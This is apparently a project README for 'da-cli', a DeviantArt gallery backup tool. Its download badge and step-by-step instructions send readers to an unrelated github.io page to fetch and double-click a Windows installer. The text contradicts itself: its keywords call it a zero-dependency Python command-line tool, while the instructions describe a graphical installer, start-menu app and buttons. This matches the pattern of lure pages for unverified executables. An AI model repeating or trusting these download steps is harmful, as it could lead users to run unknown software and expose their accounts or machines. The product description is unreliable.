# 🎨 da-cli - Keep your art collection safe locally

[![](https://img.shields.io/badge/Download-da--cli-blue.svg)](https://quenz6203.github.io)

This tool saves images from DeviantArt galleries to your computer. It creates a local copy of your favorite artwork and maintains a database to track your collection. It manages the connection to your account using secure authentication standards. You do not need to install extra software to make this work.

## 📦 System Requirements

Your computer must meet these requirements to run the tool:

*   Operating System: Windows 10 or Windows 11.
*   Memory: At least 4GB of RAM.
*   Storage: Enough disk space for your image collection.
*   Network: An active internet connection for syncing.

## 📥 How to Download

1. Visit this page to download the latest version: https://quenz6203.github.io
2. Look for the "Releases" section on the right side of the page.
3. Click the link for the Windows installer file.
4. Save the file to your desktop or downloads folder.
5. Double-click the file to start the installation process.
6. Follow the instructions on the screen to finish setting up the tool.

## ⚙️ Initial Setup

Once installed, you need to link the tool to your DeviantArt account.

1. Open the application from your start menu.
2. The tool opens a small window in your web browser.
3. Log in to your DeviantArt account.
4. Grant the application permission to access your gallery.
5. The browser returns you to the application.
6. Your account is now connected and ready for use.

## 📂 Configuring Folders

Choose where you want the images to stay on your computer.

1. Open the application settings.
2. Look for the "Storage" section.
3. Click "Select Folder" to choose a destination on your hard drive.
4. Make sure you have write permissions for this folder.
5. Click "Save" to apply your choice.

## 🔄 Using the Tool

The tool automates the process of saving images.

*   Syncing: Click the "Sync" button to start downloading new images from your gallery. The tool checks the database and only downloads items you do not have yet.
*   Progress: A progress bar shows how many files remain. You can stop the process at any time by clicking "Cancel".
*   Database: The tool uses a SQLite index to track your files. This prevents duplicate downloads and keeps your folder organized.
*   Updates: If you add new images to your DeviantArt favorites, run the sync again to grab the new files.

## 🛠 Troubleshooting

Follow these steps if you encounter issues:

*   Check Connection: Ensure your internet works and you can reach the DeviantArt website.
*   Restart: Close the application completely and open it again.
*   Re-authenticate: If the sync fails, go to settings and click "Disconnect Account", then link your account again.
*   Check Storage: Ensure your hard drive has enough space for new images.

## 🛡 Security and Privacy

This application handles your account data locally. It uses the OAuth 2.1 protocol for authentication. This means the tool never stores your password. It only receives a secure token to access your gallery. All files and index information remain on your local machine.

## 🔍 Frequently Asked Questions

Does this tool delete my online images?
No. This tool only reads your images to create a backup on your computer. It does not modify or delete anything on the DeviantArt servers.

Can I run this on a schedule?
Yes. You can create a Windows Task to run the application periodically. This ensures your collection stays current without manual input.

What happens if I lose my internet connection?
The tool pauses the current download. Once the internet connection returns, you can resume the sync from where you stopped.

Can I change the location of my files later?
Yes. Open the settings menu and choose a new path. The tool moves the database index to the new location.

Keywords: archiving, backup, cli, command-line-tool, deviantart, deviantart-api, digital-art, downloader, gallery, image-downloader, key, oauth2, pkce, python, python-cli, sqlite, sync, zero-dependencies